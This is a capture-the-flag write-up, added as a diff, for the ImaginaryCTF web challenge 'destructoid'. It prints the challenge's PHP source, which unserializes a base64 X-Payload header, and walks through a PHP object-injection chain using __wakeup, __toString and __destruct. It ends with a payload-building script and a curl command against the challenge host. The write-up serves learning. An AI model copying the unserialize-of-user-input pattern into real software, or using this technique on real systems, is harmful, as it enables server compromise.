@@ -1,0 +1,123 @@
+The first part of this was a bit guessy, but the PHP exploit was kind of cool.
+
+
+
+The Website
+-----------
+Checking the website, it drops us at a mostly empty page with the text 'ecruos? ym dnif uoy naC'.
+
+
+
+Finding the Source
+------------------
+The rules of the ctf explicitly said no automated tools like dirbuster or wfuzz, so how the fuck do they want us to find a random link?  Eventually I realized that the question mark in the text was BEFORE the word "source" if you reverse the text.  So I tried adding the query param "?source" and this gave me the following php source for the page.
+
+
+
+The Source
+----------
+
+```
+<?php
+$printflag = false;
+
+class X {
+    function __construct($cleanup) {
+        if ($cleanup === "flag") {
+            die("NO!\n");
+        }
+        $this->cleanup = $cleanup;
+    }
+
+    function __toString() {
+        return $this->cleanup;
+    }
+
+    function __destruct() {
+        global $printflag;
+        if ($this->cleanup !== "flag" && $this->cleanup !== "noflag") {
+            die("No!\n");
+        }
+        include $this->cleanup . ".php";
+        if ($printflag) {
+            echo $FLAG . "\n";
+        }
+    }
+}
+
+class Y {
+    function __wakeup() {
+        echo $this->secret . "\n";
+    }
+
+    function __toString() {
+        global $printflag;
+        $printflag = true;
+        return (new X($this->secret))->cleanup;
+    }
+}
+
+if (isset($_GET['source'])) {
+    highlight_file(__FILE__);
+    die();
+}
+echo "ecruos? ym dnif uoy naC\n";
+if (isset($_SERVER['HTTP_X_PAYLOAD'])) {
+    unserialize(base64_decode($_SERVER['HTTP_X_PAYLOAD']));
+}
+```
+
+So we have a $printFlag variable, a couple Classes, the bit that checks for '?source', the bit that asks to find the source, and then a bit that checks the $_SERVER dictionary for 'HTTP_X_PAYLOAD', base64 decodes it, and unserializes it.
+
+As far as I'm aware, $_SERVER is supposed to be for execution environment info. It can contain certain standard headers, but it usually doesn't contain just any header.  Well apparently it has an undocumented "feature" (which I only found out because of the comments on the man page) where it will take all headers sent to it and add them to the dictionary as "HTTP_<header name>".  Okay, so this PHP is grabbing the X_PAYLOAD header.  This means we can control something that gets unserialized.
+
+
+
+Deserialization Attack
+----------------------
+A quick google search about PHP serialization led me to the fact that certain functions are automatically called when on unserialized objects.  There is obviously no guarantee that what we send is actually the same structure as what is being unserialized (PHP does the same "bag of properties" thing that javascript does).  Serialization does not maintain functions on the type, but it will maintain any data variables.  So if the above code has behavior defined for unserialization and we poison the actual data that that behavior acts on, we have some level of control over the server side code.
+
+Sure enough, the Y class has a __wakeup() function.  This function will be called when a Y object is unserialized.  It tries to print the value of $this->secret.  While this normally would just mean that we can print text, it actually also means that any objects that can be implicitly converted into a string can also be printed.  And their __toString() function called.
+
+Both classes X and Y have a __toString() function.  For X, it just prints the contents of $this->cleanup.  This puts us in a similar situation as before, so we don't really care that much about it.  Anything that we could pass here we could just pass as Y->secret.  For Y->__toString(), however, sets $printFlag to True, creates a new X with $this->secret as an argument, and takes the cleanup value from this new object as it's string conversion.  In other words, if we unserialize a Y with another Y set as the first's secret value, it will create a new X with the second Y's secret value then print the value of that X's cleanup value.
+
+So we now have the ability to construct an X with an arbitrary argument.  If we do this with the value "flag", the program dies.  Otherwise, it sets $this->cleanup to that value.  As that value is what is returned to and from Y's __toString, we're once again back to effectively printing an arbitrary value.  There is one major difference this time, though.  We now have $printFlag set to True.
+
+There is one last bit of the PHP that we haven't really dug into yet.  X has a destructor.  If we were to unserialize an X (or for that X that gets created with the earlier method), it would eventually call the destructor when the script finishes.  The destructor requires the X's cleanup value to be either "flag" or "noflag".  Otherwise it will die.  It will then include the PHP file $this->cleanup . ".php".  Finally, if $printFlag is set to True, it will print the value of $FLAG which we can assume it gets from including flag.php.
+
+So we should be able to create an X with cleanup="flag" that, when destructed, prints the flag so long as $printFlag is True.  And $printFlag is true if we try to __toString() a Y.  If we make a Y that contains another Y that contains an X that contains "flag", it will unserialize the first Y, try to print the second Y, need to unserialize the second Y, which leads to trying to print the X, which will print "flag", then we get back to printing the second Y, which sets $printFlag=True and leads to creating a new X with our given X as an argument, where in the X constructor it checks if our given X equals "flag" (obviously it doesn't), and then tries to __toString our given X, which will check our given X's cleanup if it is either "flag" or "noflag" (it's "flag"), it includes "flag.php", returns $FLAG all the way back up the stack, and eventually the second Y finishes printing out with the value of $FLAG
+
+We can easily create this payload by writing some local php to create the objects and serialize them.
+
+
+
+The Payload
+-----------
+
+```
+<?php
+class X{
+    public $cleanup = "flag";
+};
+class Y{
+    public $secret;
+};
+$x = new X;
+$y = new Y;
+$y2 = new Y;
+$y2->secret = $x;
+$y->secret = $y2;
+$s = serialize($y);
+echo $s;
+?>
+```
+
+We can then base64 this.  '-w 0' turns off the line wrap.
+
+    php serialpayload.php | base64 -w 0
+
+then we can copy this into the X-Payload header when we curl the app.
+
+    curl https://destructoid.chal.imaginaryctf.org/ -H "X-Payload: TzoxOiJZIjoxOntzOjY6InNlY3JldCI7TzoxOiJZIjoxOntzOjY6InNlY3JldCI7TzoxOiJYIjoxOntzOjc6ImNsZWFudXAiO3M6NDoiZmxhZyI7fX19"
+
+and there's the flag!
